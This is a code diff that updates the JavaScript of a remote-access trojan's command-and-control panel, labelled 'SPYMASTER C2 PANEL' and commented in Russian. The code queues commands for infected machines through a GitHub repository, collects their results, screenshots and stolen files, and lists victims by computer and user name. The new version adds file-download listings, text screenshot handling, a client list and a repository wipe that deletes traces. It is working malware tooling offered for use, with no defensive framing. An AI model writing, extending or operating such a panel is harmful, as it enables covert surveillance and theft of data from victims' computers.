@@ -1,4 +1,4 @@
-// ============= SPYMASTER C2 PANEL - ПРОСТАЯ РАБОЧАЯ ВЕРСИЯ =============
+// ============= SPYMASTER C2 PANEL - ИСПРАВЛЕННАЯ ВЕРСИЯ =============
 // АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
 
 // ============= КОНФИГУРАЦИЯ =============
@@ -80,7 +80,7 @@ function showNotification(message, type = "info") {
     setTimeout(() => notification.remove(), 3000);
 }
 
-// ============= ПРОСТАЯ ОТПРАВКА КОМАНД (РАБОТАЛА ИДЕАЛЬНО) =============
+// ============= ОТПРАВКА КОМАНД =============
 async function sendCommand(command, clientId = null) {
     if (!command) return;
     
@@ -93,7 +93,6 @@ async function sendCommand(command, clientId = null) {
     addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
     
     try {
-        // 1. Получаем текущий commands.txt
         let response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
         
         let currentContent = "";
@@ -105,11 +104,9 @@ async function sendCommand(command, clientId = null) {
             sha = data.sha;
         }
         
-        // 2. Добавляем команду (БЕЗ ВСЯКИХ ВРЕМЕННЫХ МЕТОК!)
         const newContent = currentContent + finalCommand + "\n";
         const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
         
-        // 3. Отправляем обратно
         const putData = {
             message: `Command: ${command}`,
             content: encodedContent,
@@ -135,6 +132,15 @@ async function sendCommand(command, clientId = null) {
     }
 }
 
+// ============= ОПРЕДЕЛЕНИЕ ТИПА ФАЙЛА =============
+function isImageFile(filename) {
+    return filename.endsWith('.png') || filename.endsWith('.jpg') || filename.endsWith('.jpeg') || filename.endsWith('.gif');
+}
+
+function isTextFile(filename) {
+    return filename.endsWith('.txt');
+}
+
 // ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
 async function loadResults() {
     try {
@@ -144,55 +150,122 @@ async function loadResults() {
         const files = await response.json();
         if (!Array.isArray(files)) return;
         
+        // Разделяем файлы по типам
         const results = files.filter(f => f.name.startsWith("result_"));
-        const screenshots = files.filter(f => f.name.startsWith("screenshot_"));
+        const screenshots = files.filter(f => f.name.startsWith("screenshot_") && isImageFile(f.name));
+        const textScreenshots = files.filter(f => f.name.startsWith("screenshot_") && !isImageFile(f.name));
+        const fileDownloads = files.filter(f => f.name.startsWith("file_"));
         
+        // Обновляем статистику
         const resultsCount = document.getElementById("resultsCount");
         const screensCount = document.getElementById("screensCount");
         const clientsCount = document.getElementById("clientsCount");
         if (resultsCount) resultsCount.innerText = results.length;
-        if (screensCount) screensCount.innerText = screenshots.length;
+        if (screensCount) screensCount.innerText = screenshots.length + textScreenshots.length;
         if (clientsCount) clientsCount.innerText = clients.length;
         
-        // Новые результаты
+        // ============= ОБРАБОТКА РЕЗУЛЬТАТОВ (result_xxx.txt) =============
         for (const file of results) {
             if (!seenFiles.includes(file.name)) {
                 seenFiles.push(file.name);
                 const content = await fetch(file.download_url).then(r => r.text());
                 addLog(`📥 ${file.name}`, "result");
-                const lines = content.split('\n').slice(0, 5);
+                
+                // Показываем первые строки результата
+                const lines = content.split('\n').slice(0, 10);
                 for (const line of lines) {
-                    if (line.trim()) addLog(`   ${line.substring(0, 100)}`, "result");
+                    if (line.trim()) addLog(`   ${line.substring(0, 150)}`, "result");
                 }
                 
-                // Новый клиент?
-                if (content.includes("PC:")) {
-                    const pcMatch = content.match(/PC:\s*([^\n]+)/);
-                    const userMatch = content.match(/User:\s*([^\n]+)/);
-                    if (pcMatch && !clients.find(c => c.id === pcMatch[1])) {
+                // ПАРСИНГ КЛИЕНТА из результата
+                // Ищем "[Connected] PC: DESKTOP-ABC123"
+                let pcMatch = content.match(/PC:\s*([^\n]+)/);
+                let userMatch = content.match(/User:\s*([^\n]+)/);
+                
+                // Альтернативный паттерн для [Connected]
+                if (!pcMatch) {
+                    pcMatch = content.match(/\[Connected\]\s*PC:\s*([^\n]+)/i);
+                }
+                if (!pcMatch) {
+                    pcMatch = content.match(/COMPUTERNAME[=:]\s*([^\n]+)/i);
+                }
+                
+                if (pcMatch) {
+                    const clientId = pcMatch[1].trim();
+                    const userName = userMatch ? userMatch[1].trim() : "Unknown";
+                    
+                    if (!clients.find(c => c.id === clientId)) {
                         clients.push({
-                            id: pcMatch[1],
-                            user: userMatch ? userMatch[1] : "Unknown",
+                            id: clientId,
+                            user: userName,
                             firstSeen: new Date().toLocaleString()
                         });
                         updateClientsList();
-                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${pcMatch[1]}`, "client");
-                        showNotification(`Новый клиент: ${pcMatch[1]}`, "success");
+                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${clientId} (${userName})`, "client");
+                        showNotification(`Новый клиент: ${clientId}`, "success");
                     }
                 }
             }
         }
         
-        // Скриншоты
+        // ============= ОБРАБОТКА СКРИНШОТОВ =============
+        // Для PNG изображений
+        for (const shot of screenshots) {
+            if (!seenFiles.includes(shot.name)) {
+                seenFiles.push(shot.name);
+                addLog(`📸 СКРИНШОТ: ${shot.name}`, "success");
+                showNotification(`Скриншот получен!`, "success");
+            }
+        }
+        
+        // Для текстовых скриншотов (костыль, если RAT отправил как текст)
+        for (const shot of textScreenshots) {
+            if (!seenFiles.includes(shot.name)) {
+                seenFiles.push(shot.name);
+                const content = await fetch(shot.download_url).then(r => r.text());
+                addLog(`📸 СКРИНШОТ (текст): ${shot.name}`, "result");
+                addLog(`   ${content.substring(0, 200)}`, "result");
+            }
+        }
+        
+        // ============= ОБНОВЛЕНИЕ СЕТКИ СКРИНШОТОВ (только PNG) =============
         const grid = document.getElementById("screensGrid");
-        if (grid && screenshots.length > 0) {
-            grid.innerHTML = "";
-            for (const shot of screenshots.slice(-6).reverse()) {
-                const card = document.createElement("div");
-                card.className = "screenshot-card";
-                card.onclick = () => window.open(shot.download_url, '_blank');
-                card.innerHTML = `<img src="${shot.download_url}" style="width:100%;height:100px;object-fit:cover"><div style="padding:5px;font-size:10px">${shot.name}</div>`;
-                grid.appendChild(card);
+        if (grid) {
+            if (screenshots.length > 0) {
+                grid.innerHTML = "";
+                for (const shot of screenshots.slice(-12).reverse()) {
+                    const card = document.createElement("div");
+                    card.className = "screenshot-card";
+                    card.onclick = () => window.open(shot.download_url, '_blank');
+                    card.innerHTML = `
+                        <img src="${shot.download_url}?t=${Date.now()}" 
+                             style="width:100%;height:120px;object-fit:cover;background:#0a0e27" 
+                             onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'200\' height=\'120\'%3E%3Crect width=\'200\' height=\'120\' fill=\'%230a0e27\'/%3E%3Ctext x=\'100\' y=\'60\' fill=\'%2300ff41\' text-anchor=\'middle\'%3E📸%3C/text%3E%3C/svg%3E'">
+                        <div style="padding:5px;font-size:10px;text-align:center">${shot.name}</div>
+                    `;
+                    grid.appendChild(card);
+                }
+            } else {
+                grid.innerHTML = '<div class="empty-message">📭 Нет скриншотов</div>';
+            }
+        }
+        
+        // ============= ОБНОВЛЕНИЕ СПИСКА ФАЙЛОВ =============
+        const filesList = document.getElementById("filesList");
+        if (filesList) {
+            if (fileDownloads.length > 0) {
+                filesList.innerHTML = "";
+                for (const file of fileDownloads.slice(-20).reverse()) {
+                    const item = document.createElement("div");
+                    item.className = "file-item";
+                    item.innerHTML = `
+                        <span class="file-name">📄 ${file.name}</span>
+                        <button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>
+                    `;
+                    filesList.appendChild(item);
+                }
+            } else {
+                filesList.innerHTML = '<div class="empty-message">📭 Нет загруженных файлов</div>';
             }
         }
         
@@ -201,15 +274,45 @@ async function loadResults() {
     }
 }
 
+// ============= ОБНОВЛЕНИЕ СПИСКА КЛИЕНТОВ =============
 function updateClientsList() {
+    // Обновляем селект
     const select = document.getElementById("clientSelect");
-    if (!select) return;
-    select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
-    for (const client of clients) {
-        select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
+    if (select) {
+        select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
+        for (const client of clients) {
+            select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
+        }
+    }
+    
+    // Обновляем вкладку "Клиенты"
+    const clientsDiv = document.getElementById("clientsList");
+    if (clientsDiv) {
+        if (clients.length > 0) {
+            clientsDiv.innerHTML = "";
+            for (const client of clients) {
+                const card = document.createElement("div");
+                card.className = "client-card";
+                card.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:8px;padding:12px;margin-bottom:10px;cursor:pointer";
+                card.onclick = () => {
+                    document.getElementById("clientSelect").value = client.id;
+                    currentClient = client.id;
+                    addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
+                };
+                card.innerHTML = `
+                    <div style="font-weight:bold;font-size:14px">🖥️ ${client.id}</div>
+                    <div style="font-size:11px;color:#888">👤 ${client.user}</div>
+                    <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${client.firstSeen}</div>
+                `;
+                clientsDiv.appendChild(card);
+            }
+        } else {
+            clientsDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных клиентов</div>';
+        }
     }
 }
 
+// ============= ОСТАЛЬНЫЕ ФУНКЦИИ =============
 async function clearCommands() {
     try {
         const response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
@@ -262,7 +365,7 @@ function startAutoRefresh() {
 
 // ============= ИНИЦИАЛИЗАЦИЯ =============
 function init() {
-    addLog("🐀 SPYMASTER C2 PANEL v1.0", "system");
+    addLog("🐀 SPYMASTER C2 PANEL v2.0", "system");
     addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
     
     // Стили
@@ -277,8 +380,13 @@ function init() {
             .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
             .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
             .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
-            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 5px; overflow: hidden; background: #0a0e27; }
-            .client-card { cursor: pointer; }
+            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 5px; overflow: hidden; background: #0a0e27; transition: transform 0.2s; }
+            .screenshot-card:hover { transform: scale(1.02); }
+            .client-card { cursor: pointer; transition: all 0.2s; }
+            .client-card:hover { background: #1a1f4e !important; transform: translateX(5px); }
+            .file-item { background: #0a0e27; border: 1px solid #00ff41; border-radius: 5px; padding: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
+            .file-download { background: #1a1f4e; border: none; color: #00ff41; padding: 5px 10px; cursor: pointer; border-radius: 4px; }
+            .empty-message { text-align: center; padding: 40px; color: #444; }
         `;
         document.head.appendChild(style);
     }
@@ -347,6 +455,7 @@ function init() {
                     if (response.ok) {
                         const files = await response.json();
                         const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
+                        let deleted = 0;
                         for (const file of files) {
                             if (protectedFiles.includes(file.name)) continue;
                             await fetch(`${API_URL}/${file.name}`, {
@@ -354,8 +463,10 @@ function init() {
                                 headers: HEADERS,
                                 body: JSON.stringify({ message: "Delete", sha: file.sha, branch: "main" })
                             });
+                            deleted++;
+                            await new Promise(r => setTimeout(r, 100));
                         }
-                        addLog("💣 РЕПОЗИТОРИЙ ОЧИЩЕН", "success");
+                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
                         seenFiles = [];
                         clients = [];
                         loadResults();
